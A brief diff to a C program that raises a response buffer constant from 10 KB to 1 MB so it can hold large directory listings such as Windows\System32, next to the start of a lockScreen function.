@@ -3,7 +3,7 @@
 #include <stdlib.h>
 
 #define BUFFER_SIZE 1024
-#define RESPONSE_BUFFER_SIZE 1024 * 10  // 10 KB
+#define RESPONSE_BUFFER_SIZE 1024 * 1024    // 1MB (Windows\System32 includes many files..)
 
 void lockScreen()
 {
